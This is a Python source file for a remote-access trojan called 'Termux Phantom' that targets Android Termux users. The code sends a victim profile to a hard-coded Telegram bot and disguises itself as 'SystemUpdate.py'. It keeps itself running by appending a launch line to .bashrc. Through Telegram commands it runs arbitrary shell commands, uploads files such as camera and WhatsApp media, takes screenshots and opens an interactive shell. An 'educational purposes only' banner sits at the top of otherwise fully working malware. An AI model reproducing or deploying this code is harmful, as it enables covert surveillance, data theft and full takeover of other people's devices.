#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# .-.-.-.-{ TERMUX PHANTOM v5.0 - AUTOMATED TELEGRAM BOT CONTROL }-.-.-.-.
# EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED ACCESS ILLEGAL

import os
import sys
import json
import requests
import threading
import subprocess
from time import sleep
from datetime import datetime

# TELEGRAM CONFIGURATION
BOT_TOKEN = "6438089549:AAHbCWCGnF0GtdFygIBoHJWuRnX_zk_5aV8"
CHAT_ID = "6063558798"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# PAYLOAD CONFIGURATION
PAYLOAD_NAME = "SystemUpdate.py"
AUTORUN_FILE = ".bashrc"
PERSISTENCE_CMD = f"python {PAYLOAD_NAME} &"

class TermuxPhantom:
    def __init__(self):
        self.session_id = datetime.now().strftime("%Y%m%d%H%M%S")
        self.victim_data = {}
        
    def send_telegram(self, message):
        """Send message to Telegram bot"""
        try:
            url = API_URL + "sendMessage"
            payload = {
                "chat_id": CHAT_ID,
                "text": f"[{self.session_id}] {message}",
                "parse_mode": "HTML"
            }
            requests.post(url, data=payload, timeout=10)
        except Exception:
            pass
    
    def collect_intel(self):
        """Collect victim device intelligence"""
        try:
            # BASIC DEVICE INFO
            self.victim_data['user'] = subprocess.getoutput("whoami")
            self.victim_data['host'] = subprocess.getoutput("hostname")
            self.victim_data['os'] = subprocess.getoutput("uname -a")
            
            # NETWORK INFORMATION
            self.victim_data['ip_public'] = subprocess.getoutput("curl -s ifconfig.me")
            self.victim_data['ip_local'] = subprocess.getoutput("ip route get 1 | awk '{print $7}'")
            
            # STORAGE ANALYSIS
            self.victim_data['storage'] = subprocess.getoutput("df -h")
            
            # SENSITIVE FILE CHECK
            files = [
                "/sdcard/DCIM/Camera/",
                "/sdcard/Download/",
                "/sdcard/WhatsApp/Media/",
                "/sdcard/Telegram/"
            ]
            found_files = []
            for f in files:
                if os.path.exists(f):
                    found_files.append(f)
            self.victim_data['sensitive_dirs'] = found_files
            
            # TERMUX PACKAGES
            self.victim_data['packages'] = subprocess.getoutput("pkg list-installed")
            
            return True
        except Exception as e:
            return False
    
    def establish_persistence(self):
        """Ensure payload survives reboots"""
        try:
            with open(os.path.expanduser(f"~/{AUTORUN_FILE}"), "a") as f:
                f.write(f"\n{PERSISTENCE_CMD}\n")
            return True
        except Exception:
            return False
    
    def execute_command(self, cmd):
        """Execute system command and return output"""
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8')
        except Exception as e:
            return f"Command failed: {str(e)}"
    
    def telegram_command_listener(self):
        """Listen for Telegram commands"""
        last_update_id = 0
        while True:
            try:
                response = requests.get(API_URL + "getUpdates", params={"offset": last_update_id + 1})
                updates = response.json().get("result", [])
                
                for update in updates:
                    last_update_id = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "")
                    
                    if str(message.get("chat", {}).get("id")) == CHAT_ID:
                        if text.startswith("/cmd "):
                            command = text[5:]
                            output = self.execute_command(command)
                            self.send_telegram(f"<b>Command:</b> <code>{command}</code>\n"
                                              f"<b>Output:</b>\n<pre>{output[:3000]}</pre>")
                            
                        elif text.startswith("/download "):
                            file_path = text[10:]
                            if os.path.exists(file_path):
                                with open(file_path, "rb") as f:
                                    requests.post(
                                        API_URL + "sendDocument",
                                        data={"chat_id": CHAT_ID},
                                        files={"document": (os.path.basename(file_path), f)}
                                    )
                            else:
                                self.send_telegram(f"❌ File not found: {file_path}")
                                
                        elif text == "/screenshot":
                            try:
                                subprocess.run("termux-screenshot", shell=True)
                                latest = max([f for f in os.listdir('.') if f.endswith('.png')], 
                                            key=os.path.getctime)
                                with open(latest, "rb") as f:
                                    requests.post(
                                        API_URL + "sendPhoto",
                                        data={"chat_id": CHAT_ID},
                                        files={"photo": f}
                                    )
                            except Exception as e:
                                self.send_telegram(f"📸 Screenshot failed: {str(e)}")
                                
                        elif text == "/help":
                            help_msg = (
                                "<b>Phantom Control Panel</b>\n"
                                "/cmd [command] - Execute shell command\n"
                                "/download [path] - Download file\n"
                                "/screenshot - Capture screen\n"
                                "/info - Show victim info\n"
                                "/shell - Open interactive shell"
                            )
                            self.send_telegram(help_msg)
                            
                        elif text == "/info":
                            self.send_telegram(json.dumps(self.victim_data, indent=2))
                            
                        elif text == "/shell":
                            self.send_telegram("⚠️ Interactive shell activated")
                            self.interactive_shell()
                            
            except Exception as e:
                pass
            sleep(5)
    
    def interactive_shell(self):
        """Interactive shell session over Telegram"""
        self.send_telegram("💻 Interactive shell started. Type commands directly.")
        last_update_id = 0
        while True:
            try:
                response = requests.get(API_URL + "getUpdates", params={"offset": last_update_id + 1})
                updates = response.json().get("result", [])
                
                for update in updates:
                    last_update_id = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "")
                    
                    if str(message.get("chat", {}).get("id")) == CHAT_ID and text:
                        if text.lower() == "/exit":
                            self.send_telegram("🔚 Interactive shell terminated")
                            return
                            
                        output = self.execute_command(text)
                        self.send_telegram(f"<b>Output:</b>\n<pre>{output[:3000]}</pre>")
                        
            except Exception:
                pass
            sleep(2)
    
    def main(self):
        """Main operational flow"""
        # INITIALIZE PAYLOAD
        self.send_telegram(f"🔥 Phantom activated on victim device: {self.session_id}")
        
        # COLLECT INTEL
        if self.collect_intel():
            self.send_telegram(f"📡 Victim intelligence collected\n{json.dumps(self.victim_data, indent=2)}")
        
        # ESTABLISH PERSISTENCE
        if self.establish_persistence():
            self.send_telegram("🔒 Persistence mechanism installed")
        
        # START COMMAND LISTENER
        self.send_telegram("👂 Listening for Telegram commands...")
        threading.Thread(target=self.telegram_command_listener, daemon=True).start()
        
        # KEEP MAIN THREAD ALIVE
        while True:
            sleep(60)

if __name__ == "__main__":
    phantom = TermuxPhantom()
    phantom.main()
